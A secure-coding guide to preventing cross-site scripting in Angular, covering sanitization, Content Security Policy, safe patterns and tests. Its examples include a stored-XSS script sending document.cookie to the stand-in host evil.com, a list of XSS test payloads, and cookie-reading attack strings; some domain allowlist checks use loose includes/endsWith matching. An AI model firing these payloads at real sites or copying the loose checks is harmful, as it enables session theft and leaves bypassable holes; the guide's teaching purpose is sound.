# XSS Prevention in Angular

Complete guide to preventing Cross-Site Scripting (XSS) attacks in Angular applications.

## Table of Contents

1. [Understanding XSS](#understanding-xss)
2. [Angular's Built-in Protection](#angulars-built-in-protection)
3. [DomSanitizer](#domsanitizer)
4. [Content Security Policy](#content-security-policy)
5. [Secure Coding Patterns](#secure-coding-patterns)
6. [Common Vulnerabilities](#common-vulnerabilities)
7. [Testing for XSS](#testing-for-xss)

---

## Understanding XSS

### Types of XSS

**1. Stored XSS (Persistent)**
```typescript
// Attacker stores malicious script in database
userBio = '<script>fetch("evil.com?cookie=" + document.cookie)</script>';

// Later displayed to other users
<div [innerHTML]="userBio"></div> // Executes script
```

**2. Reflected XSS (Non-persistent)**
```typescript
// Malicious link: https://example.com?search=<script>alert(1)</script>

// App reflects input without sanitization
<div>Search results for: {{ searchQuery }}</div>
```

**3. DOM-based XSS**
```typescript
// URL: https://example.com#<img src=x onerror=alert(1)>

// Unsafe DOM manipulation
element.innerHTML = location.hash.substring(1);
```

### XSS Attack Vectors

```typescript
// Script tags
<script>alert('XSS')</script>

// Event handlers
<img src=x onerror=alert('XSS')>
<div onclick=alert('XSS')>

// Data URLs
<a href="data:text/html,<script>alert('XSS')</script>">

// JavaScript URLs
<a href="javascript:alert('XSS')">

// Style injection
<div style="background:url('javascript:alert(XSS)')">

// SVG
<svg onload=alert('XSS')>

// Object/embed
<object data="javascript:alert('XSS')">
```

---

## Angular's Built-in Protection

### Automatic Escaping

```typescript
// ✅ SAFE: Angular auto-escapes
@Component({
  template: `
    <div>{{ userInput }}</div>
    <div [textContent]="userInput"></div>
  `
})
export class SafeComponent {
  userInput = '<script>alert("XSS")</script>';
  // Rendered as text, not executed
}
```

### Security Contexts

Angular sanitizes based on context:

| Context | Element | Sanitization |
|---------|---------|--------------|
| HTML | `[innerHTML]` | Remove scripts, styles |
| Style | `[style]` | Remove dangerous CSS |
| URL | `[href]`, `[src]` | Block javascript: |
| Resource URL | `<iframe src>` | Strict validation |

---

## DomSanitizer

### Basic Usage

```typescript
import { DomSanitizer, SafeHtml, SecurityContext } from '@angular/platform-browser';

@Component({
  template: `<div [innerHTML]="safeHtml"></div>`
})
export class SanitizedComponent {
  safeHtml: SafeHtml;
  
  constructor(private sanitizer: DomSanitizer) {
    const userInput = '<p>Hello</p><script>alert("XSS")</script>';
    
    // Sanitize HTML
    this.safeHtml = this.sanitizer.sanitize(
      SecurityContext.HTML,
      userInput
    );
    // Result: '<p>Hello</p>' (script removed)
  }
}
```

### Security Contexts

```typescript
export class SecurityContextsComponent {
  constructor(private sanitizer: DomSanitizer) {}
  
  // HTML Context
  sanitizeHtml(html: string): SafeHtml {
    return this.sanitizer.sanitize(SecurityContext.HTML, html);
  }
  
  // Style Context
  sanitizeStyle(style: string): SafeStyle {
    return this.sanitizer.sanitize(SecurityContext.STYLE, style);
  }
  
  // URL Context
  sanitizeUrl(url: string): SafeUrl {
    return this.sanitizer.sanitize(SecurityContext.URL, url);
  }
  
  // Resource URL Context (iframes, etc)
  sanitizeResourceUrl(url: string): SafeResourceUrl {
    return this.sanitizer.sanitize(SecurityContext.RESOURCE_URL, url);
  }
}
```

### Bypassing Security (Use with Extreme Caution)

```typescript
// ⚠️ DANGEROUS: Only use when absolutely necessary
export class BypassSecurityComponent {
  constructor(private sanitizer: DomSanitizer) {}
  
  // Bypass HTML sanitization
  getTrustedHtml(html: string): SafeHtml {
    // Only use with trusted, server-validated content!
    return this.sanitizer.bypassSecurityTrustHtml(html);
  }
  
  // Bypass URL sanitization
  getTrustedUrl(url: string): SafeUrl {
    // Validate URL is from trusted domain first!
    if (this.isTrustedDomain(url)) {
      return this.sanitizer.bypassSecurityTrustUrl(url);
    }
    throw new Error('Untrusted URL');
  }
  
  private isTrustedDomain(url: string): boolean {
    const trustedDomains = ['example.com', 'cdn.example.com'];
    try {
      const domain = new URL(url).hostname;
      return trustedDomains.some(trusted => domain.endsWith(trusted));
    } catch {
      return false;
    }
  }
}
```

### Safe HTML with Markdown

```typescript
import { marked } from 'marked';

@Component({
  template: `<div [innerHTML]="renderedMarkdown"></div>`
})
export class MarkdownComponent {
  @Input() set markdown(value: string) {
    // Convert markdown to HTML
    const rawHtml = marked(value);
    
    // Sanitize the HTML
    this.renderedMarkdown = this.sanitizer.sanitize(
      SecurityContext.HTML,
      rawHtml
    );
  }
  
  renderedMarkdown: SafeHtml;
  
  constructor(private sanitizer: DomSanitizer) {}
}
```

---

## Content Security Policy

### CSP Headers

```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM}';
  style-src 'self' 'nonce-{RANDOM}';
  img-src 'self' data: https:;
  font-src 'self' data:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
">
```

### CSP Directives

```
default-src 'self'                # Default policy
script-src 'self' 'unsafe-inline' # Where scripts can load from
style-src 'self' 'unsafe-inline'  # Where styles can load from
img-src 'self' data: https:       # Image sources
font-src 'self' data:             # Font sources
connect-src 'self' api.example.com # XHR/WebSocket connections
frame-ancestors 'none'            # Prevent clickjacking
base-uri 'self'                   # Restrict <base> tag
form-action 'self'                # Form submission targets
upgrade-insecure-requests         # Upgrade HTTP to HTTPS
```

### CSP with Nonce

```typescript
// Server-side (Node.js example)
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  
  res.setHeader('Content-Security-Policy', `
    script-src 'self' 'nonce-${nonce}';
    style-src 'self' 'nonce-${nonce}';
  `);
  
  next();
});

// HTML template
<script nonce="<%= nonce %>">
  console.log('Allowed with nonce');
</script>
```

### CSP Violation Reporting

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  report-uri /api/csp-violations;
">
```

```typescript
// Server endpoint to receive violations
app.post('/api/csp-violations', (req, res) => {
  console.error('CSP Violation:', req.body);
  // Log to security monitoring system
  res.status(204).end();
});
```

---

## Secure Coding Patterns

### Pattern 1: Avoid innerHTML

```typescript
// ❌ BAD
@Component({
  template: `<div [innerHTML]="content"></div>`
})

// ✅ GOOD: Use text interpolation
@Component({
  template: `<div>{{ content }}</div>`
})

// ✅ GOOD: Component composition
@Component({
  template: `
    <div *ngFor="let item of items">
      <app-safe-content [data]="item"></app-safe-content>
    </div>
  `
})
```

### Pattern 2: Whitelist URLs

```typescript
@Component({
  template: `<a [href]="safeUrl">Link</a>`
})
export class LinkComponent {
  @Input() set url(value: string) {
    this.safeUrl = this.validateUrl(value);
  }
  
  safeUrl: string | null;
  
  private allowedProtocols = ['http:', 'https:', 'mailto:'];
  private blockedDomains = ['evil.com', 'phishing.net'];
  
  private validateUrl(url: string): string | null {
    try {
      const parsed = new URL(url);
      
      // Check protocol
      if (!this.allowedProtocols.includes(parsed.protocol)) {
        console.warn('Blocked URL with invalid protocol:', url);
        return null;
      }
      
      // Check domain blacklist
      if (this.blockedDomains.some(blocked => 
        parsed.hostname.includes(blocked)
      )) {
        console.warn('Blocked URL from blacklisted domain:', url);
        return null;
      }
      
      return url;
    } catch {
      console.warn('Invalid URL:', url);
      return null;
    }
  }
}
```

### Pattern 3: Sanitize User Content

```typescript
@Injectable({ providedIn: 'root' })
export class ContentSanitizerService {
  constructor(private sanitizer: DomSanitizer) {}
  
  // Sanitize HTML content
  sanitizeHtml(html: string): SafeHtml {
    // Remove dangerous tags
    const dangerous = ['script', 'iframe', 'object', 'embed', 'style'];
    let cleaned = html;
    
    dangerous.forEach(tag => {
      const regex = new RegExp(`<${tag}[^>]*>.*?<\/${tag}>`, 'gi');
      cleaned = cleaned.replace(regex, '');
    });
    
    // Remove event handlers
    cleaned = cleaned.replace(/on\w+\s*=\s*["'][^"']*["']/gi, '');
    
    // Sanitize with Angular
    return this.sanitizer.sanitize(SecurityContext.HTML, cleaned);
  }
  
  // Sanitize for display in form
  sanitizeFormInput(input: string): string {
    return input
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\//g, '&#x2F;');
  }
}
```

### Pattern 4: Safe File Upload

```typescript
@Component({
  template: `
    <input type="file" (change)="onFileSelect($event)" accept="image/*">
    <img *ngIf="preview" [src]="preview" alt="Preview">
  `
})
export class SafeFileUploadComponent {
  preview: SafeUrl | null = null;
  
  constructor(private sanitizer: DomSanitizer) {}
  
  onFileSelect(event: Event) {
    const input = event.target as HTMLInputElement;
    const file = input.files?.[0];
    
    if (!file) return;
    
    // Validate file type
    const validTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (!validTypes.includes(file.type)) {
      alert('Invalid file type');
      return;
    }
    
    // Validate file size (5MB max)
    if (file.size > 5 * 1024 * 1024) {
      alert('File too large');
      return;
    }
    
    // Create safe preview
    const reader = new FileReader();
    reader.onload = (e) => {
      const dataUrl = e.target?.result as string;
      
      // Sanitize data URL
      this.preview = this.sanitizer.sanitize(
        SecurityContext.URL,
        dataUrl
      );
    };
    reader.readAsDataURL(file);
  }
}
```

### Pattern 5: Safe Dynamic Content

```typescript
// ❌ BAD: Dynamic script execution
eval(userCode);
new Function(userCode)();

// ✅ GOOD: Configuration-based logic
@Component({
  template: `
    <div *ngIf="config.showHeader">
      <h1>{{ config.title }}</h1>
    </div>
    
    <div *ngFor="let section of config.sections">
      <app-section [data]="section"></app-section>
    </div>
  `
})
export class ConfigurableComponent {
  @Input() config: {
    showHeader: boolean;
    title: string;
    sections: Section[];
  };
}
```

---

## Common Vulnerabilities

### Vulnerability 1: innerHTML with User Data

```typescript
// ❌ VULNERABLE
@Component({
  template: `<div [innerHTML]="userBio"></div>`
})
export class VulnerableComponent {
  @Input() userBio: string;
}

// Attack:
userBio = '<img src=x onerror="alert(document.cookie)">';

// ✅ FIX 1: Remove innerHTML
@Component({
  template: `<div>{{ userBio }}</div>`
})

// ✅ FIX 2: Sanitize
@Component({
  template: `<div [innerHTML]="safeUserBio"></div>`
})
export class SecureComponent {
  @Input() set userBio(value: string) {
    this.safeUserBio = this.sanitizer.sanitize(
      SecurityContext.HTML,
      value
    );
  }
  safeUserBio: SafeHtml;
  constructor(private sanitizer: DomSanitizer) {}
}
```

### Vulnerability 2: Unsafe URL Binding

```typescript
// ❌ VULNERABLE
<a [href]="userUrl">Click</a>

// Attack:
userUrl = 'javascript:alert(document.cookie)';

// ✅ FIX
@Component({
  template: `<a [href]="safeUrl">Click</a>`
})
export class SecureComponent {
  @Input() set userUrl(value: string) {
    try {
      const url = new URL(value);
      if (url.protocol === 'http:' || url.protocol === 'https:') {
        this.safeUrl = value;
      } else {
        console.warn('Blocked unsafe URL protocol:', url.protocol);
        this.safeUrl = null;
      }
    } catch {
      this.safeUrl = null;
    }
  }
  safeUrl: string | null;
}
```

### Vulnerability 3: Document Write

```typescript
// ❌ NEVER USE
document.write(userContent);
document.writeln(userContent);

// ✅ USE ANGULAR
@Component({
  template: `<div>{{ content }}</div>`
})
```

### Vulnerability 4: Unsafe Third-Party Content

```typescript
// ❌ VULNERABLE: Untrusted iframe
<iframe [src]="videoUrl"></iframe>

// ✅ SECURE: Whitelist domains
@Component({
  template: `<iframe *ngIf="trustedUrl" [src]="trustedUrl"></iframe>`
})
export class VideoComponent {
  @Input() set videoUrl(url: string) {
    const trusted = ['youtube.com', 'vimeo.com'];
    try {
      const domain = new URL(url).hostname;
      if (trusted.some(t => domain.includes(t))) {
        this.trustedUrl = this.sanitizer.bypassSecurityTrustResourceUrl(url);
      } else {
        console.warn('Untrusted video domain:', domain);
        this.trustedUrl = null;
      }
    } catch {
      this.trustedUrl = null;
    }
  }
  trustedUrl: SafeResourceUrl | null;
  constructor(private sanitizer: DomSanitizer) {}
}
```

---

## Testing for XSS

### Manual Testing

```typescript
// Test payloads
const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<select onfocus=alert("XSS") autofocus>',
  '<textarea onfocus=alert("XSS") autofocus>',
  '<img src=x:alert(alt) onerror=eval(src) alt=xss>',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<img src=/ onerror="alert(String.fromCharCode(88,83,83))">',
];

// Test each input field
xssPayloads.forEach(payload => {
  component.userInput = payload;
  fixture.detectChanges();
  // Check if script executes or is safely escaped
});
```

### Automated Testing

```typescript
describe('XSS Prevention', () => {
  it('should escape HTML in text interpolation', () => {
    component.content = '<script>alert("XSS")</script>';
    fixture.detectChanges();
    
    const element = fixture.nativeElement;
    expect(element.textContent).toContain('&lt;script&gt;');
    expect(element.innerHTML).not.toContain('<script>');
  });
  
  it('should sanitize innerHTML', () => {
    const malicious = '<p>Safe</p><script>alert("XSS")</script>';
    component.setHtml(malicious);
    fixture.detectChanges();
    
    const element = fixture.nativeElement.querySelector('.content');
    expect(element.innerHTML).toContain('<p>Safe</p>');
    expect(element.innerHTML).not.toContain('<script>');
  });
  
  it('should block javascript: URLs', () => {
    component.url = 'javascript:alert("XSS")';
    fixture.detectChanges();
    
    const link = fixture.nativeElement.querySelector('a');
    expect(link.getAttribute('href')).toBeNull();
  });
});
```

### Security Testing Tools

```bash
# OWASP ZAP
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:4200

# Snyk
npm install -g snyk
snyk test
snyk monitor

# npm audit
npm audit
npm audit fix
```

---

## Best Practices Summary

✅ **DO**:
- Use text interpolation `{{ }}` by default
- Sanitize with `DomSanitizer` when HTML is needed
- Implement Content Security Policy
- Validate and whitelist URLs
- Escape user input in forms
- Use Angular's built-in protection
- Test with XSS payloads
- Keep dependencies updated

❌ **DON'T**:
- Use `innerHTML` with user data
- Use `bypassSecurityTrust*` without validation
- Use `eval()` or `Function()` constructor
- Trust client-side validation alone
- Disable CSP without good reason
- Expose sensitive data in templates
- Use `document.write()`

---

## Quick Reference

### Security Context Methods

```typescript
// Sanitize
sanitizer.sanitize(SecurityContext.HTML, html);
sanitizer.sanitize(SecurityContext.STYLE, style);
sanitizer.sanitize(SecurityContext.URL, url);
sanitizer.sanitize(SecurityContext.RESOURCE_URL, url);

// Bypass (use with caution!)
sanitizer.bypassSecurityTrustHtml(html);
sanitizer.bypassSecurityTrustStyle(style);
sanitizer.bypassSecurityTrustUrl(url);
sanitizer.bypassSecurityTrustResourceUrl(url);
```

### CSP Quick Start

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
">
```

---

*Prevent XSS, protect users! 🛡️*
